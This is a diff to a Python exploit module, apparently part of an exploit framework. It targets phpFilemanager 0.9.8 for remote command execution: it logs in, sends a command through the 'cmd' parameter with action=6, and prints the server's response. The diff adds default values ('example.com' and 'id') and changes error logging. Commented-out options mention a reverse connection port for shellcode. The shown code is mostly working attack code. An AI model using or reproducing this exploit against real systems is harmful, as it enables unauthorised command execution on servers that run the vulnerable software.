@@ -19,8 +19,8 @@ INFO['PATH'] = "/" #folder on website
 INFO['AUTHOR'] = "dmts"
 
 OPTIONS = OrderedDict()
-OPTIONS["URL"] = "", dict(description = 'URL to phpFilemanager-0.9.8')
-OPTIONS["COMMAND"] = "", dict(description = 'Command to run')
+OPTIONS["URL"] = "example.com", dict(description = 'URL to phpFilemanager-0.9.8')
+OPTIONS["COMMAND"] = "id", dict(description = 'Command to run')
 #OPTIONS["LOCAL_IP_ADDRESS"] = "192.168.1.115", dict(description = 'System IP address (ex. 192.168.10.20)')
 #OPTIONS["REVERSE_CONNECTION_PORT"] = 4000, dict(description = 'Reverse connection port for shellcode')
 #####################################################################
@@ -47,7 +47,8 @@ class exploit(Sploit):
 			get_in =session.post(url,data=params)
 			get_in.raise_for_status()
 		except Exception as e:
-			self.log('[!] [FAIL] Failed to access : '+e)
+			self.log('[!] [FAIL] Failed to access : ')
+			self.log(e)
 			sys.exit(1)
 		try:
 			resp =session.get(url,params={'action':6,'cmd':command})
@@ -55,7 +56,8 @@ class exploit(Sploit):
 			self.log('[*] Command to execute : '+command)
 			self.log(resp.text)		
 		except requests.exceptions.HTTPError as e:
-			self.log('[!] [FAIL] Failed to execute command : '+e)
+			self.log('[!] [FAIL] Failed to execute command : ')
+			self.log(e)
 			sys.exit(1)
 
 	def run(self):
